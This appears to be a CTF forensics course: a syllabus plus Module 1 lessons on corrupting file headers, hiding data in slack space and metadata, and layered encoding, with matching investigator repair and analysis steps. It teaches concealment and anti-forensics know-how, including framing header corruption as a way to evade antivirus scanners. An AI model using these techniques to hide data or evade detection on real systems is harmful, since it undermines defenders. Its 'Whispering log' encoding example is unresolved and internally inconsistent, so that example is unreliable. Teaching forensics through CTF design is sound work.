# Syllabus
#### #### Module 1: Fundamental File Analysis & Metadata
- **Core Concepts:** File signatures, Magic Bytes, Hexadecimal structure, Encoding schemes.
- **The Architect (Creation):**
    - Techniques for manual header corruption and magic byte obfuscation.
    - embedding data in file slack space.
    - Manipulating EXIF and IPTC metadata.
    - Implementing multi-layer encoding (Base64, Hex, ROT13, XOR).
- **The Investigator (Solution):**
    - Hex analysis and file signature verification.
    - Header repair and file reconstruction.
    - Metadata extraction using `exiftool` or `strings`.
    - Automated decoding and cipher identification (CyberChef workflows).
---
#### #### Module 2: Steganography & Data Concealment
- **Core Concepts:** LSB (Least Significant Bit), audio frequency manipulation, whitespace steganography.
- **The Architect (Creation):**
    - Embedding payloads via LSB in PNG/BMP.
    - Hiding text in audio spectrograms (Spectrogram embedding).
    - Creating polyglot files (valid as multiple file types).
    - Zero-width character injection and whitespace manipulation (SNOW).
- **The Investigator (Solution):**
    - Visual plane analysis and bit plane extraction (`zsteg`, `stegsolve`).
    - Audio spectrum analysis (`Audacity`, `Sonic Visualiser`).
    - Polyglot decomposition and extraction.
    - Steganalysis detection tools.
---
#### #### Module 3: Network Forensics (Packet Analysis)
- **Core Concepts:** PCAP structure, TCP/IP handshake, Protocol hierarchy (HTTP, DNS, SMB, FTP).
- **The Architect (Creation):**
    - Generating synthetic traffic with Python (`Scapy`).
    - Simulating data exfiltration via DNS tunneling or ICMP payloads.
    - Creating "Needle in a Haystack" scenarios (burst traffic).
    - Implementing SSL/TLS traffic with provided (but hidden) session keys.
- **The Investigator (Solution):**
    - Stream reassembly and object export in Wireshark/TShark.
    - Detecting anomalies in protocol headers.
    - Decrypting SSL traffic using master secrets/key logs.
    - Reconstructing files from unencrypted SMB/FTP streams.
---
#### #### Module 4: Memory Forensics (Volatile Data)
- **Core Concepts:** RAM acquisition, Virtual Address Translation, Process structures (EPROCESS/KPROCESS).
- **The Architect (Creation):**
    - Safe techniques for dumping RAM (Vmware snapshots vs. `LiME`).
    - Injecting code or malware into running processes.
    - Leaving artifacts in clipboard, command history, or environment variables.
    - Simulating "fileless" malware execution.
- **The Investigator (Solution):**
    - Profile identification and memory image verification.
    - Process listing (pslist, pstree) and anomaly detection.
    - Extracting command line history, clipboard data, and environment variables.
    - Dumping DLLs and executables from memory for analysis (`Volatility`, `Rekall`).
---
#### #### Module 5: Disk Forensics & File Systems
- **Core Concepts:** NTFS ($MFT), FAT, Ext4, Journaling, Allocation units.
- **The Architect (Creation):**
    - Creating custom disk images (DD, E01).
    - Hiding data in Alternate Data Streams (ADS) on Windows.
    - Simulating file deletion and recycle bin activity.
    - "Timestomping" (manipulating file creation/access timestamps).
- **The Investigator (Solution):**
    - Mounting and navigating forensic images (`Autopsy`, `FTK Imager`).
    - File carving and recovery of deleted data (`Foremost`, `Scalpel`).
    - Parsing MFT records and detecting ADS.
    - Timeline analysis and detecting timestomping discrepancies.
---
#### #### Module 6: Operating System Artifacts (Windows)
- **Core Concepts:** Registry hives, Prefetch, Shimcache, Event Logs, LNK files.
- **The Architect (Creation):**
    - Modifying Registry keys to simulate persistence.
    - Generating specific Event IDs (Logon/Logoff, USB insertion).
    - Creating misleading LNK (shortcut) files.
    - Simulating Recent Docs and Shellbag activity.
- **The Investigator (Solution):**
    - Registry Hive parsing (NTUSER.DAT, SAM, SYSTEM).
    - Parsing Prefetch and Amcache to prove program execution.
    - Event Log correlation and filtering.
    - USB device history reconstruction.
---
#### #### Module 7: Operating System Artifacts (Linux/Unix)
- **Core Concepts:** `/var/log`, Cron jobs, Bash history, `/proc` filesystem.
- **The Architect (Creation):**
    - Creating malicious Cron jobs or Systemd services.
    - Obfuscating Bash history (ignoring space-prefixed commands).
    - Log tampering (clearing `utmp`, `wtmp`, `btmp`).
    - Hiding files using dot-notation or deep directory nesting.
- **The Investigator (Solution):**
    - analyzing `.bash_history` and `.viminfo`.
    - Parsing authentication logs (`auth.log`, `secure`).
    - Auditing scheduled tasks and daemons.
    - Recovering deleted log entries.
---
#### #### Module 8: Mobile Forensics (Android/iOS)
- **Core Concepts:** SQLite databases, APK structure, Backup formats, ADB.
- **The Architect (Creation):**
    - Creating custom Android applications (APK) with hidden flags.
    - Generating SMS/MMS and Call Log databases.
    - Simulating WhatsApp/Telegram chat exports.
    - Creating full ADB backups with encrypted data.
- **The Investigator (Solution):**
    - Decompiling APKs (`jadx`, `apktool`).
    - SQLite database browser and query analysis.
    - Parsing `backup.ab` or iTunes backup files.
    - Recovering deleted chat artifacts.
---
#### #### Module 9: Scripting & Automation
- **Core Concepts:** Python (struct, binascii), Bash scripting, Regex.
- **The Architect (Creation):**
    - Writing scripts to generate massive datasets (noise) to hide the flag.
    - Creating custom XOR/Bitwise encryption scripts.
- **The Investigator (Solution):**
    - Writing "Solvers" to brute-force custom encoding.
    - Automating file carving from blobs.
    - Using Regex for pattern matching (flags, emails, IPs) across large datasets.

# Module 1: Fundamental File Analysis & Metadata

## The Architect (Creation)

### Techniques for manual header corruption and magic byte obfuscation.

#### 1. Technical Theory

File signatures, commonly known as "magic bytes," are specific sequences of bytes located at the beginning (and sometimes end) of a file that identify its format to the operating system and software applications. For example, a PNG image always begins with `89 50 4E 47 0D 0A 1A 0A`.

When an Operating System attempts to open a file, it often prioritizes these magic bytes over the file extension. By corrupting or obfuscating these bytes, an Architect can:

1. **Bypass automated scanners:** Prevent tools like `file` or antivirus scanners from correctly identifying the file type.
    
2. **Break default viewers:** Cause image viewers or document readers to throw "Corrupted File" or "Unknown Format" errors.
    
3. **Force analysis:** Compel the participant to examine the raw hex data to identify the true file structure and repair the header.
    

#### 2. Practical Implementation (The "How-To")

To create this challenge, you must overwrite the correct magic bytes with garbage data or a misleading signature from a different file format.

**Method A: Hex Editing (Manual)**

1. Open the target file (e.g., `flag.jpg`) in a hex editor.
    
2. Locate the first few bytes (Offset `0x00`).
    
    - _JPEG Standard:_ `FF D8 FF`
        
3. Overwrite these bytes with random values (e.g., `00 00 00` or `DE AD BE EF`).
    
4. Save as a generic file or keep the original extension to confuse the player.
    

Method B: Python Scripting (Automated Corruption)

This script allows you to corrupt the headers of multiple files or apply specific misleading headers (e.g., making a PNG look like a GIF).

Python

```
import sys

def corrupt_header(filepath, new_bytes):
    """
    Overwrites the beginning of a file with specific bytes.
    
    :param filepath: Path to the file to corrupt
    :param new_bytes: A bytes object containing the new header data
    """
    try:
        with open(filepath, 'r+b') as f:
            # Move pointer to the start of the file
            f.seek(0)
            # Write the obfuscated bytes
            f.write(new_bytes)
            print(f"[+] Successfully corrupted header of {filepath}")
    except IOError as e:
        print(f"[-] Error: {e}")

# Usage Example:
# 1. Create a PNG file (True header: 89 50 4E 47 ...)
# 2. Overwrite it with a GIF header (GIF89a -> 47 49 46 38 39 61) to mislead 'file' command
#    or overwrite with null bytes.

target_file = "challenge_flag.png"

# Option 1: Nullify the header (Harder to guess original type without footer/structure analysis)
null_header = b'\x00' * 8
# corrupt_header(target_file, null_header)

# Option 2: Spoof a GIF header (Misleading)
gif_header = b'\x47\x49\x46\x38\x39\x61' 
corrupt_header(target_file, gif_header)
```

Method C: Command Line (Linux/dd)

You can use dd or printf to patch a file header in a one-liner.

Bash

```
# Overwrite the first 8 bytes of 'image.png' with zeros
printf '\x00\x00\x00\x00\x00\x00\x00\x00' | dd of=image.png bs=1 seek=0 count=8 conv=notrunc

# Explanation:
# conv=notrunc: Crucial. Tells dd not to truncate the file after the write. 
# Without this, the rest of the file content is deleted.
```

#### 3. Example Scenario

Scenario Name: "The Identity Crisis"

Description: Participants are given a file named confidential.pdf. When they attempt to open it with a PDF viewer, it fails to load. Running the file command identifies it as a "GIF image data," but image viewers display static noise or fail.

The Setup:

1. Take a standard **PNG** image containing the flag.
    
2. Use a hex editor or script to overwrite the PNG magic bytes (`89 50 4E 47...`) with GIF magic bytes (`47 49 46 38...`).
    
3. Rename the file to .pdf.
    
    Solution Path: The investigator must open the file in a hex editor, notice the internal chunks resemble PNG structure (e.g., IHDR, IDAT, IEND), and repair the header back to PNG standards to view the image.
    

#### 4. Key Tools

- **010 Editor / HxD / Hex Fiend:** For manual editing and visual inspection of file structures.
    
- **Python:** For automating the corruption process across multiple files.
    
- **dd (Data Definition):** For quick command-line byte patching.

---

### Embedding data in file slack space

#### 1. Technical Theory

File Slack (or Slack Space) represents the unused storage capacity between the end of the file's logical data (End of File - EOF) and the physical end of the cluster assigned to that file.

- **Cluster Concept:** File systems (like NTFS, FAT32, EXT4) store data in fixed-size blocks called "clusters" or "allocation units" (commonly 4KB or 4096 bytes).
    
- **The Gap:** If a file is 1000 bytes and the cluster size is 4096 bytes, the file system allocates the full 4096 bytes. The first 1000 bytes contain the actual data. The remaining 3096 bytes are **Slack Space**.
    
- **The Exploit:** The operating system's file explorer only reads the "Logical Size" (1000 bytes). Data hidden in the remaining 3096 bytes is invisible to the user and standard applications but remains physically on the disk.
    

**Key Constraints:**

- You cannot hide data larger than the available slack (Cluster Size - Logical File Size).
    
- If the file grows and requires the slack space for legitimate data, the hidden data will be overwritten.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Architect (Creation)**

To create a challenge involving slack space, you must modify the raw bytes of a disk image (or physical drive) without updating the file system's metadata table (which records the file size).

**Method 1: Manual Injection (Hex Editor)**

1. Create a raw disk image (e.g., `challenge.img`) and mount it.
    
2. Save a target file (e.g., `cover.txt`) onto the image. Ensure it is smaller than the cluster size (e.g., 500 bytes on a 4KB cluster system).
    
3. Unmount the image.
    
4. Open `challenge.img` in a Hex Editor (like HxD or 010 Editor).
    
5. Search for the hex content of `cover.txt`.
    
6. Immediately after the last byte of the legitimate file data, overwrite the existing zeros (or random data) with your flag/payload.
    
7. **Crucial:** Do _not_ change the file size in the directory entry/MFT.
    

Method 2: Python Automation (Raw Image Patcher)

This script injects a flag into the slack space of a specific file within a raw disk image. It assumes you know the offset of the file or searches for a unique header string.

Python

```
import sys

def inject_slack(image_path, unique_file_string, secret_data):
    """
    Injects secret_data into the slack space immediately following 
    a unique string found in the raw disk image.
    """
    unique_bytes = unique_file_string.encode('utf-8')
    secret_bytes = secret_data.encode('utf-8')
    
    # Standard cluster size (adjust based on your target filesystem)
    cluster_size = 4096 
    
    try:
        with open(image_path, 'r+b') as f:
            # Read the entire image into memory (for small CTF images only)
            # For large images, use chunked reading.
            data = f.read()
            
            # Find the location of the file content
            offset = data.find(unique_bytes)
            
            if offset == -1:
                print(f"[-] Error: Unique string '{unique_file_string}' not found.")
                return

            # Calculate where the file ends
            file_end = offset + len(unique_bytes)
            
            # Calculate remaining space in the current cluster
            # This assumes the file started at the beginning of a cluster, 
            # or we are calculating slack relative to the sector alignment.
            # For precise injection, we strictly append to the logical end.
            
            print(f"[+] File content found at offset: {hex(offset)}")
            print(f"[+] Injecting flag at offset: {hex(file_end)}")
            
            # Move pointer to the end of the file content
            f.seek(file_end)
            
            # Write the secret data (overwriting the slack)
            f.write(secret_bytes)
            
            print(f"[+] Successfully injected: '{secret_data}'")
            
    except FileNotFoundError:
        print(f"[-] Error: Image file '{image_path}' not found.")

# Usage Example
# Ensure you have a raw image 'challenge.img' containing a text file with the string "CONFIDENTIAL_REPORT_HEADER"
if __name__ == "__main__":
    # Example parameters
    img_file = "challenge.img" 
    target_string = "CONFIDENTIAL_REPORT_HEADER" 
    flag = "CTF{H1dd3n_1n_Th3_V0id}"
    
    # create a dummy image for demonstration if it doesn't exist
    with open(img_file, "wb") as f:
        # Create 1MB image with a "file" in it
        f.write(b'\x00' * 1024 * 1024)
        f.seek(4096) # Simulate file at start of cluster 1
        f.write(target_string.encode('utf-8'))
        
    inject_slack(img_file, target_string, flag)
```

#### 3. Example Scenario

Title: The Ghost in the Machine

Scenario: Participants are provided with a disk image employee_laptop.dd seized from a corporate spy. The filesystem contains a text file named meeting_notes.txt (logical size: 250 bytes).

The Twist: The suspect used a custom tool to hide the encryption key for their communication channel in the slack space of meeting_notes.txt.

The Solution: Analyzing the file normally shows only boring meeting minutes. Analyzing the hex dump of the cluster or using fls and icat (Sleuth Kit) reveals that the cluster contains data beyond the 250th byte, revealing the string Key: AES_SLACK_MASTER.

#### 4. Key Tools

- **Hex Editors (HxD, 010 Editor, wxHexEditor):** Essential for manually viewing the raw disk bytes and pasting data into the slack space area.
    
- **dd:** Command-line utility used to create raw disk images and manipulate data at specific block offsets.
    
- **Python:** Used to automate the calculation of offsets and injection of payloads into binary files/images.

---

### Manipulating EXIF and IPTC metadata.

#### 1. Technical Theory

Metadata in image files constitutes data about the image data. The two most common standards encountered in forensics are EXIF and IPTC.

**EXIF (Exchangeable Image File Format):** This standard is used primarily by hardware devices (cameras, smartphones) to record technical details about how the image was captured. This data is stored in a tagged structure resembling TIFF format, typically within the APP1 segment of a JPEG file. Common fields include timestamps, camera model, shutter speed, aperture, ISO settings, and, crucially for forensics, GPS coordinates.

**IPTC (International Press Telecommunications Council) - IIM:** This is an older standard focused on administrative and descriptive metadata used by news and photo agencies. It includes fields for caption, copyright, credit, keywords, and urgency. It is often stored in the APP13 segment of a JPEG.

For the CTF Architect, these standards provide structured containers to hide textual data, encoded strings, or geographical location hints without altering the visual appearance of the image. They are malleable and easily edited using specialized software.

#### 2. Practical Implementation (Creation)

The goal is to embed arbitrary data (flags, hints, or decoys) into metadata fields. The industry standard for this is **ExifTool**, but Python libraries can be used for programmatic generation.

**Method 1: Using ExifTool (Command Line)**

ExifTool is the most powerful utility for reading and writing meta information in a wide variety of files.

A. Basic String Insertion (EXIF & IPTC)

Insert a flag or hint into standard text fields like 'Artist' (EXIF) or 'Caption-Abstract' (IPTC).

Bash

```
# Set EXIF Artist tag and IPTC Caption tag
exiftool -Artist="Flag Creator" -Caption-Abstract="Try looking deeper than surface metadata." challenge_image.jpg

# Verify the change
exiftool challenge_image.jpg
# Note: Exiftool automatically creates a backup file named image.jpg_original.
# To avoid creating backups during CTF asset generation, use the -overwrite_original flag.
exiftool -overwrite_original -Artist="Flag Creator" challenge_image.jpg
```

B. Inserting Geolocation Data (EXIF GPS)

Add specific GPS coordinates to create an OSINT or physical location challenge. The format is typically decimal degrees.

Bash

```
# Set GPS coordinates to the Eiffel Tower (48.8584° N, 2.2945° E)
# Exiftool handles the conversion between decimal and degrees/minutes/seconds automatically.
exiftool -overwrite_original -GPSLatitude="48.8584" -GPSLatitudeRef="N" -GPSLongitude="2.2945" -GPSLongitudeRef="E" location_challenge.jpg
```

C. Embedding Encoded Data into Obscure Tags

Hide a base64 encoded flag in a less commonly reviewed tag, like UserComment or ImageHistory.

Bash

```
# Create a base64 encoded flag string
# echo -n "flag{h1dd3n_1n_pl41n_s1ght}" | base64
# Output: ZmxhZ3toMWRkM25fMW5fcGw0MW5fczFnaHR9

# Insert the encoded string into the UserComment tag.
# Note: Some tags require specific character sets.
exiftool -overwrite_original -UserComment="ZmxhZ3toMWRkM25fMW5fcGw0MW5fczFnaHR9" encoded_challenge.jpg

# Alternatively, read the data directly from a file to avoid shell escaping issues with complex flags
echo -n "flag{s0m3_c0mpl3x_d4t4_&_symb0ls}" > flag.txt
exiftool -overwrite_original "-UserComment<=flag.txt" complex_challenge.jpg
rm flag.txt
```

**Method 2: Using Python (`piexif`)**

For batch creation of challenges, Python is ideal. The `piexif` library allows precise manipulation of EXIF data structures.

Python

```
import piexif
from PIL import Image
import io

# 1. Create a dummy image (if one doesn't exist)
img = Image.new('RGB', (60, 30), color='blue')
img_byte_arr = io.BytesIO()
img.save(img_byte_arr, format='JPEG')
img_data = img_byte_arr.getvalue()
filename = "python_exif_challenge.jpg"

# 2. Define EXIF data dictionary structure
exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}, "thumbnail": None}

# 3. Insert Flag into UserComment (Tag ID 37510)
# UserComment typically requires an 8-byte prefix indicating encoding (e.g., ASCII, Unicode)
flag_string = "flag{pyth0n_scr1pt3d_m3t4d4t4}"
# Prefix for ASCII encoding
prefix = b'\x41\x53\x43\x49\x49\x00\x00\x00'
encoded_comment = prefix + flag_string.encode('utf-8')

exif_dict["Exif"][piexif.ExifIFD.UserComment] = encoded_comment

# 4. Insert GPS coordinates (e.g., 0,0 - "Null Island")
# GPS tags often require rational numbers (tuples of numerator, denominator)
exif_dict["GPS"][piexif.GPSIFD.GPSLatitudeRef] = "N"
# 0/1 degrees
exif_dict["GPS"][piexif.GPSIFD.GPSLatitude] = [(0, 1), (0, 1), (0, 100)]
exif_dict["GPS"][piexif.GPSIFD.GPSLongitudeRef] = "E"
# 0/1 degrees
exif_dict["GPS"][piexif.GPSIFD.GPSLongitude] = [(0, 1), (0, 1), (0, 100)]

# 5. Dump EXIF data to bytes and insert into the image
exif_bytes = piexif.dump(exif_dict)
piexif.insert(exif_bytes, img_data, filename)

print(f"Created {filename} with embedded EXIF data.")
```

#### 3. Example Scenario

Challenge Name: "The Traveler's Secret"

Scenario Description: Agents intercepted a photo sent by a suspect known for using steganography. The image appears to be a standard landscape, but intelligence suggests it contains instructions for a dead drop.

Architect's Setup:

1. Take a generic landscape photo (`landscape.jpg`).
    
2. Generate a flag: `flag{G30_l0c4t10n_1s_k3y}`.
    
3. Use ExifTool to embed coordinates in the GPS tags pointing to a specific public park statue.
    
4. Use ExifTool to embed a base64 string in the IPTC `Keywords` tag. Decoded, the string reads: "Look at the statue's plaque at the coordinates provided."
    
5. The flag is actually the name of the statue found at those coordinates (an OSINT step derived from metadata analysis).
    

#### 4. Key Tools

1. **ExifTool (Phil Harvey):** The industry-standard command-line application for reading, writing, and editing meta information in a wide variety of files.
    
2. **piexif (Python Library):** A Python library for scripting EXIF manipulations, useful for automating challenge creation or handling complex data structures.
    
3. **exiv2:** Another robust command-line utility and C++ library to manage image metadata, serving as a strong alternative to ExifTool.

---

### Implementing multi-layer encoding (Base64, Hex, ROT13, XOR)

#### 1. Technical Theory

![Image of data encoding process flow diagram](https://encrypted-tbn0.gstatic.com/licensed-image?q=tbn:ANd9GcSfL5L-seX0UHn3C5nx0DovYo5axfj4SeQH4ODTbWQZ1EgiyP4iDsCm25jgfTP83IBe7uOUvLTnLo-ldzFzQJ4OUUTngZWAfrLeknXocMS1cbVlWgs)

Shutterstock

Multi-layer encoding acts as a form of obfuscation that transforms a plaintext payload into an unreadable format through a sequence of reversible algorithms. Unlike encryption, which relies on cryptographic keys and mathematical hardness, encoding transforms data representation.

- **Base64:** Converts binary data into ASCII characters using a 64-character set (A-Z, a-z, 0-9, +, /) and `=` padding. It is often the final outer layer to ensure the artifact is printable text.
    
- **Hex (Base16):** Represents binary data using 16 symbols (0-9, A-F). Two hex digits represent one byte.
    
- **ROT13:** A simple substitution cipher that rotates alphabet characters by 13 places. It is its own inverse (applying it twice returns the original text).
    
- **XOR (Exclusive OR):** A bitwise operation where bits are flipped based on a key. If the key is known or guessed, the operation is perfectly reversible ($A \oplus B = C \implies C \oplus B = A$).
    

**Key Constraints:** The primary goal is to confuse automated scanners or junior analysts. However, because standard encoding adds characteristic patterns (e.g., Base64 padding or Hex character constraints), experienced investigators can often identify the layers visually.

#### 2. Practical Implementation (The "How-To")

To create a robust CTF challenge, you must automate the encoding layers to ensure the flag can be perfectly recovered. The following methods demonstrate how to wrap a flag in multiple layers.

Method A: The "Onion" Python Script (Recommended)

This script allows you to define a specific order of operations to encode a flag. This ensures accuracy when designing the solution logic.

Python

```
import base64
import codecs

def xor_data(data, key):
    # Cycle through the key to XOR the data
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def encode_challenge(flag, key):
    print(f"Original: {flag}")
    
    # Layer 1: XOR with a Key
    # We convert the string to bytes first
    layer1 = xor_data(flag.encode('utf-8'), key.encode('utf-8'))
    print(f"Layer 1 (XOR): {layer1}")

    # Layer 2: Hex Encoding
    # Converts the XOR bytes to a hex string
    layer2 = layer1.hex()
    print(f"Layer 2 (Hex): {layer2}")

    # Layer 3: ROT13
    # ROT13 works on the Hex characters (0-9 are unaffected, a-f are rotated)
    # Note: Standard ROT13 libraries work on strings. 
    # 'a'->'n', 'b'->'o', etc. This obfuscates the 'hex' look.
    layer3 = codecs.encode(layer2, 'rot_13')
    print(f"Layer 3 (ROT13): {layer3}")

    # Layer 4: Base64
    # Final wrap to make it look like a standard token
    layer4 = base64.b64encode(layer3.encode('utf-8')).decode('utf-8')
    print(f"Layer 4 (Base64 - FINAL): {layer4}")
    
    return layer4

# Configuration
FLAG = "CTF{l4y3rs_0n_l4y3rs}"
XOR_KEY = "s3cr3t"

final_artifact = encode_challenge(FLAG, XOR_KEY)
```

Method B: Linux Command Line Piping

For quick, one-off artifact creation, you can pipe standard Linux utilities. Note that standard tr (used for ROT13) behaves differently depending on locales, so explicit sets are safer.

Bash

```
# 1. Create a file with the flag
echo -n "CTF{cli_wizardry}" > flag.txt

# 2. Apply the chain: XOR -> Hex -> ROT13 -> Base64
# Note: XOR is harder to do cleanly in one-line bash without perl/python. 
# We will use a simple python inline for the XOR step.

cat flag.txt | \
python3 -c "import sys; key=b'key'; data=sys.stdin.buffer.read(); sys.stdout.buffer.write(bytes([b ^ key[i % len(key)] for i, b in enumerate(data)]))" | \
xxd -p | \
tr 'A-Za-z' 'N-ZA-Mn-za-m' | \
base64
```

Verification Step:

Always verify your artifact is solvable before releasing.

1. Take the output string.
    
2. `Base64 Decode` -> `ROT13` -> `Hex Decode` -> `XOR (with key)`.
    
3. Ensure the exact flag matches.
    

#### 3. Example Scenario

Scenario Title: "The Whispering log"

Context: You are investigating a compromised web server. The attacker left a persistence script, but the payload location is obfuscated within the Apache access logs.

Artifact:

Inside access.log, the User-Agent string for a specific IP address is unusual:

User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) - Token: Z2ZnYmY4Z2hqa3B4

The Challenge:

The string Z2ZnYmY4Z2hqa3B4 is the challenge.

1. **Analysis:** It looks like Base64.
    
2. **Decode 1 (B64):** Result is `gfgbf8ghjkpx` (Looks like gibberish, but characters are a-z, 0-9).
    
3. **Analysis:** The pattern resembles ROT13 shifted hex (h-z range).
    
4. Decode 2 (ROT13): Result is tstos8tuwxck (Still not clear, perhaps the scenario implies a simpler hex or just XOR).
    
    Note: In a real creation scenario, you would align the ROT13 result to look like valid Hex to guide the solver to the next step.
    

#### 4. Key Tools

- **Python 3:** The industry standard for scripting complex encoding/decoding logic for both creation and solution.
    
- **CyberChef:** The "Swiss Army Knife" for data analysis. Essential for prototyping the encoding recipe (e.g., dragging blocks for "To Hex", "ROT13", "XOR", "To Base64").
    
- **Linux Coreutils (`base64`, `tr`, `xxd`):** Essential for command-line manipulation and quick verification.

---

## The Investigator (Solution)

### Hex analysis and file signature verification

#### 1. Technical Theory

File signatures, often referred to as "Magic Bytes," are specific sequences of bytes located at the beginning (header) and sometimes the end (trailer) of a file. Operating systems and applications use these bytes to identify the file format and determine how to process the data, regardless of the file extension.

- **Mechanism:** When a file is opened, the loader reads the first few bytes. For example, a standard PNG image always begins with `89 50 4E 47 0D 0A 1A 0A`. If these bytes are missing or corrupted, the image viewer will fail to render the content.
    
- **Key Constraints:** File extensions (e.g., `.jpg`, `.pdf`) are user-level metadata and are easily spoofed. In a forensics context, the file signature is the authoritative source of truth for file type identification.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator**

A. Initial Identification (Automated)

Before opening a hex editor, use CLI tools to check if the system can automatically identify the file type based on its magic bytes.

Bash

```
# Basic file identification using the 'file' command
file suspicious_file.xyz

# Output example (if header is intact):
# suspicious_file.xyz: PNG image data, 800 x 600, 8-bit/color RGBA, non-interlaced
```

B. Manual Hex Inspection

If the file command returns "data" or an incorrect type, you must manually inspect the binary.

Bash

```
# View the first 64 bytes of the file in canonical hex + ASCII display
xxd -l 64 suspicious_file.xyz

# Example output of a valid JPEG:
# 00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0060  ......JFIF.....`
```

C. Common CTF Magic Bytes Reference

You will frequently encounter these signatures in challenges:

|**File Type**|**Magic Bytes (Hex)**|**ASCII Representation**|
|---|---|---|
|**JPEG**|`FF D8 FF`|`...`|
|**PNG**|`89 50 4E 47 0D 0A 1A 0A`|`.PNG....`|
|**ZIP / DOCX**|`50 4B 03 04`|`PK..`|
|**PDF**|`25 50 44 46`|`%PDF`|
|**ELF (Linux Exec)**|`7F 45 4C 46`|`.ELF`|
|**GIF**|`47 49 46 38`|`GIF8`|

D. Python Script: Signature Scanner

When dealing with multiple files or stripped extensions, use Python to identify types based on raw bytes.

Python

```
import sys

def identify_signature(filepath):
    signatures = {
        b'\xFF\xD8\xFF': 'JPEG Image',
        b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A': 'PNG Image',
        b'\x50\x4B\x03\x04': 'ZIP Archive / Office Doc',
        b'\x25\x50\x44\x46': 'PDF Document',
        b'\x7F\x45\x4C\x46': 'ELF Executable'
    }

    try:
        with open(filepath, 'rb') as f:
            header = f.read(32) # Read first 32 bytes
            
            for sig, description in signatures.items():
                if header.startswith(sig):
                    return f"Detected: {description} (Hex: {sig.hex().upper()})"
            
            return f"Unknown signature. Header: {header[:8].hex().upper()}"
            
    except FileNotFoundError:
        return "File not found."

# Usage
print(identify_signature('unknown_file.dat'))
```

E. Repairing Corrupt Headers (Hex Editing)

If a file is known to be a PNG but behaves like "data," the magic bytes are likely zeroed out or modified (xor-ed).

1. Open the file in a Hex Editor (e.g., `HxD` or `hexedit`).
    
2. Navigate to offset `0x0`.
    
3. Overwrite the corrupt bytes with the correct signature (e.g., replace `00 00 00 00` with `89 50 4E 47`).
    
4. Save and attempt to open the file.
    

#### 3. Example Scenario

Scenario: You are provided a file named backup.db which does not open in any database viewer.

Analysis:

1. Running `file backup.db` returns: `backup.db: data`.
    
2. Running `xxd -l 16 backup.db` reveals the first bytes are `50 4B 03 04`.
    
3. Conclusion: The hex signature 50 4B 03 04 corresponds to the PK (Zip) header. The file is actually a ZIP archive disguised as a database file.
    
    Solution: Rename the file to backup.zip and extract the contents to find the flag flag.txt.
    

#### 4. Key Tools

- **`file`**: Standard Linux command for automated file type classification.
    
- **`HxD` / `ImHex`**: Advanced hex editors for viewing and modifying raw binary data.
    
- **`TrID`**: A utility designed to identify file types from their binary signatures with a massive database of definitions.
    
- **`xxd`**: Command-line hex dumper useful for quick inspection in terminal environments.

---

### Header repair and file reconstruction

#### 1. Technical Theory

File headers, often referred to as "magic bytes" or file signatures, are specific sequences of bytes located at the beginning of a file. Operating systems and applications use these bytes to identify the format of the file and determine how to process it, regardless of the file extension.

When a file header is corrupted, overwritten, or missing, standard applications will fail to open the file, often reporting it as "unreadable" or "corrupted." The data payload (the actual content) remains intact, but the "key" to interpret that data is broken.

- **Magic Bytes:** Unique hex signatures (e.g., `89 50 4E 47` for PNG).
    
- **File Footer/Trailer:** Some formats also require a specific ending sequence (e.g., `FF D9` for JPEG) to be considered valid.
    
- **Offset:** The header is almost always at offset `0x0`.
    

#### 2. Practical Implementation (The "How-To")

The Investigator's goal is to identify the file type based on context or footer data, locate the correct magic bytes for that format, and hex-edit the file to restore them.

Step 1: Identification and Diagnosis

First, attempt to identify the file using the file command. If the header is corrupt, it will likely return "data" or an incorrect type. Then, examine the hex dump.

Bash

```
# Check file type
file suspicious_file.dat

# Inspect the first 32 bytes of the file
xxd -l 32 suspicious_file.dat
```

Step 2: Analysis via Hex Editor

Open the file in a hex editor. Compare the first few bytes against a database of known file signatures (e.g., Gary Kessler's File Signature Table).

- **Scenario:** If the first bytes are `00 00 00 00` or random garbage, but the file extension is `.jpg` (or you suspect it is an image), you need to write the correct bytes.
    
- **Context Clues:** If the header is gone, look at the **ASCII decoding** in the hex editor. You might see strings like `IHDR` (indicating PNG) or `JFIF` (indicating JPEG) slightly further down, which confirms the file type.
    

Step 3: Repairing the Header (Python)

While manual hex editing is common, using Python is faster and repeatable for CTF challenges.

_Script: Magic Byte Patcher_

Python

```
def patch_header(file_path, magic_bytes):
    """
    Overwrites the beginning of a file with specific magic bytes.
    
    :param file_path: Path to the corrupted file
    :param magic_bytes: Byte string of the correct header (e.g., b'\x89\x50\x4E\x47')
    """
    try:
        with open(file_path, 'r+b') as f:
            # Move pointer to the start of the file
            f.seek(0)
            # Write the correct magic bytes
            f.write(magic_bytes)
            print(f"[+] Header patched successfully for {file_path}")
    except IOError as e:
        print(f"[-] Error processing file: {e}")

# Example Usage: Repairing a PNG file
# PNG Magic Bytes: 89 50 4E 47 0D 0A 1A 0A
png_signature = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'
patch_header('corrupted_evidence.png', png_signature)
```

Step 4: Verification

After patching, verify the fix:

Bash

```
file corrupted_evidence.png
# Output should now be: PNG image data, ...
```

#### 3. Example Scenario

Scenario: You are provided a file named backup_tape.img recovered from a wiped server. The challenge description hints that it contains a blueprint image.

Analysis:

1. `file backup_tape.img` returns `data`.
    
2. Opening it in a hex editor reveals the first 4 bytes are `FF FF FF FF`.
    
3. Scanning down to offset `0x06`, you see the ASCII string `JFIF`.
    
4. **Conclusion:** This is a JPEG file with a wiped header.
    
5. **Solution:** You replace `FF FF FF FF` with the JPEG magic bytes `FF D8 FF E0` (standard JPEG/JFIF header). The file now opens, revealing the flag written on the blueprint.
    

#### 4. Key Tools

- **ImHex / 010 Editor / HxD:** Industry-standard hex editors for visual inspection and manual modification.
    
- **`file` command:** Essential Linux utility for determining file types based on magic numbers.
    
- **`ghex`:** A lightweight graphical hex editor for Linux useful for quick patches.

---

### Embedding data in file slack space

#### 1. Technical Theory

File Slack (or Slack Space) is a crucial forensic artifact that represents the unallocated space remaining in the final disk cluster assigned to a file. The gap exists because file systems allocate data in fixed-size blocks (**clusters**), but the file's **Logical Size** (EOF) rarely aligns perfectly with the cluster boundary.

